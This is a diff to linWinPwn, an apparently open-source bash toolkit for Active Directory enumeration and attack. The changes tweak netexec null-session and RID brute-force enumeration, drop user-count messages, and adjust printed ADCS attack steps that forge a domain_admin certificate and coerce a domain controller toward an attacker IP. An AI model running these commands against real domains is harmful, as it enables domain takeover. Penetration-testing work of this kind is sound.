@@ -743,7 +743,7 @@ authenticate() {
 
     #Perform authentication using provided credentials
     if [ "${nullsess_bool}" == false ]; then
-        auth_check=$(run_command "${netexec} smb ${target} ${argument_ne}" 2>&1 | grep "\[-\]\|Traceback" -A 10 2>&1)
+        auth_check=$(run_command "${netexec} smb ${target} ${argument_ne}" 2>&1 | grep -v " Error checking if user is admin on "|  grep "\[-\]\|Traceback" -A 10 2>&1)
         if [ -n "$auth_check" ]; then
             echo "$auth_check"
             if [[ $auth_check == *"STATUS_NOT_SUPPORTED"* ]]; then
@@ -1112,14 +1112,10 @@ ne_smb_enum() {
         run_command "${netexec} ${ne_verbose} smb ${target} -u Guest -p '' --users --log ${output_dir}/DomainRecon/ne_users_nullsess_smb_${dc_domain}.txt" 2>&1
         run_command "${netexec} ${ne_verbose} smb ${target} -u ${rand_user} -p '' --users --log ${output_dir}/DomainRecon/ne_users_nullsess_smb_${dc_domain}.txt" 2>&1
         awk '!/\[-|\[+|\[\*/ && /SMB/ {gsub(/ +/, " "); split($12, arr, "\\"); print arr[2]}' "${output_dir}/DomainRecon/ne_users_nullsess_smb_${dc_domain}.txt" | grep -v "-Username-" >"${output_dir}/DomainRecon/Users/users_list_ne_smb_nullsess_${dc_domain}.txt" 2>&1
-        count=$(sort -u "${output_dir}/DomainRecon/Users/users_list_ne_smb_nullsess_${dc_domain}.txt" | wc -l)
-        echo -e "${GREEN}[+] Found ${count} users using RPC User Enum${NC}"
     else
         echo -e "${BLUE}[*] Users / Computers Enumeration (RPC authenticated)${NC}"
         run_command "${netexec} ${ne_verbose} smb ${target} ${argument_ne} --users --log ${output_dir}/DomainRecon/ne_users_auth_smb_${dc_domain}.txt" 2>&1
         grep -v "\[-\|\[+\|\[\*" "${output_dir}/DomainRecon/ne_users_auth_smb_${dc_domain}.txt" | grep SMB | sed 's/[ ][ ]*/ /g' | cut -d " " -f 12 | cut -d "\\" -f 2 | grep -v "-Username-" >"${output_dir}/DomainRecon/Users/users_list_ne_smb_${dc_domain}.txt" 2>&1
-        count=$(sort -u "${output_dir}/DomainRecon/Users/users_list_ne_smb_${dc_domain}.txt" | wc -l | cut -d " " -f 1)
-        echo -e "${GREEN}[+] Found ${count} users using RPC User Enum${NC}"
         run_command "${netexec} ${ne_verbose} smb ${target} ${argument_ne} --computers" >"${output_dir}/DomainRecon/ne_computers_auth_smb_${dc_domain}.txt"
     fi
     parse_users
@@ -1137,14 +1133,10 @@ ne_ldap_enum() {
         run_command "${netexec} ${ne_verbose} ldap ${target} -u Guest -p '' ${ldaps_param} --users --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_users_nullsess_ldap_${dc_domain}.txt" 2>&1
         run_command "${netexec} ${ne_verbose} ldap ${target} -u ${rand_user} -p '' ${ldaps_param} --users --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_users_nullsess_ldap_${dc_domain}.txt" 2>&1
         grep -vE '\[-|\[+|\[\*' "${output_dir}/DomainRecon/ne_users_nullsess_ldap_${dc_domain}.txt" 2>/dev/null | grep LDAP | tr -s ' ' | cut -d ' ' -f 12 | grep -v "-Username-" >"${output_dir}/DomainRecon/Users/users_list_ne_ldap_nullsess_${dc_domain}.txt" 2>&1
-        count=$(sort -u "${output_dir}/DomainRecon/Users/users_list_ne_ldap_nullsess_${dc_domain}.txt" | wc -l)
-        echo -e "${GREEN}[+] Found ${count} users using LDAP User Enum${NC}"
     else
         echo -e "${BLUE}[*] Users Enumeration (LDAP authenticated)${NC}"
         run_command "${netexec} ${ne_verbose} ldap ${target} ${argument_ne} ${ldaps_param} --users --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_users_auth_ldap_${dc_domain}.txt" 2>&1
         grep -vE '\[-|\[+|\[\*' "${output_dir}/DomainRecon/ne_users_auth_ldap_${dc_domain}.txt" 2>/dev/null | grep LDAP | tr -s ' ' | cut -d ' ' -f 12 | grep -v "-Username-" >"${output_dir}/DomainRecon/Users/users_list_ne_ldap_${dc_domain}.txt" 2>&1
-        count=$(sort -u "${output_dir}/DomainRecon/Users/users_list_ne_ldap_${dc_domain}.txt" | wc -l)
-        echo -e "${GREEN}[+] Found ${count} users using LDAP User Enum${NC}"
     fi
     parse_users
     echo -e ""
@@ -1761,7 +1753,7 @@ adcs_vuln_parse() {
         for vulnca in $esc6_vuln; do
             echo -e "${YELLOW}# ${vulnca} certificate authority${NC}"
             echo -e "${CYAN}1. Request certificate with an arbitrary UPN (domain_admin or DC or both):${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca $vulnca -target < ${pki_servers} > -template User -upn domain_admin@${dc_domain}"
+            echo -e "${certipy} req ${argument_certipy} -ca $vulnca -target < ${pki_servers} > -template User -upn domain_admin@${dc_domain} -dc-ip ${dc_ip}"
             echo -e "${CYAN}2. Authenticate using pfx of domain_admin:${NC}"
             echo -e "${certipy} auth -pfx domain_admin.pfx -dc-ip ${dc_ip}"
         done
@@ -1795,7 +1787,7 @@ adcs_vuln_parse() {
             echo -e "${CYAN}1. Start the relay server:${NC}"
             echo -e "${certipy} relay -target http://${dc_ip}"
             echo -e "${CYAN}2. Coerce Domain Controller:${NC}"
-            echo -e "${coercer} coerce ${argument_coercer} -t ${dc_ip} -l $attacker_IP --dc-ip $dc_ip"
+            echo -e "${coercer} coerce ${argument_coercer} -t ${dc_ip} -l $attacker_IP --dc-ip ${dc_ip}"
         done
     fi
 
@@ -1985,8 +1977,6 @@ ridbrute_attack() {
         run_command "${netexec} ${ne_verbose} smb ${target} -u ${rand_user} -p '' --rid-brute --log ${output_dir}/BruteForce/ne_rid_brute_${dc_domain}.txt"
         #Parsing user lists
         grep "SidTypeUser" "${output_dir}/BruteForce/ne_rid_brute_${dc_domain}.txt" | cut -d "\\" -f 2 | sort -u | sed "s/ (SidTypeUser)//g" >"${output_dir}/DomainRecon/Users/users_list_ridbrute_${dc_domain}.txt" 2>&1
-        count=$(wc -l "${output_dir}/DomainRecon/Users/users_list_ridbrute_${dc_domain}.txt" | cut -d " " -f 1)
-        echo -e "${GREEN}[+] Found ${count} users using RID Brute Force${NC}"
         parse_users
     else
         echo -e "${PURPLE}[-] Null session RID brute force skipped (credentials provided)${NC}"
@@ -5628,9 +5618,13 @@ auth_menu() {
         else
             if [ "${pass_bool}" == true ]; then
                 aes_gen=$("${python3}" "${aesKrbKeyGen}" -domain "${domain}" -u "'${user}'" -pass "${password}")
-                echo -e "${GREEN}[+] AES Keys generated:${NC} ${aes_gen}"
                 aes_key=$(echo -e "${aes_gen}" | grep "AES256" | cut -d " " -f 4)
-                echo -e "${GREEN}[+] Re-run linWinPwn to use AES key instead:${NC} linWinPwn.sh -t ${dc_ip} -d ${domain} -u '${user}' -A ${aes_key}"
+                if [[ ! "${aes_key}" == "" ]]; then 
+                    echo -e "${GREEN}[+] AES Keys generated:${NC} ${aes_gen}"
+                    echo -e "${GREEN}[+] Re-run linWinPwn to use AES key instead:${NC} linWinPwn.sh -t ${dc_ip} -d ${domain} -u '${user}' -A ${aes_key}"
+                else
+                    echo -e "${RED}[-] Error generating AES Keys${NC}"
+                fi
             else
                 echo -e "${RED}[-] Error! Requires password...${NC}"
             fi
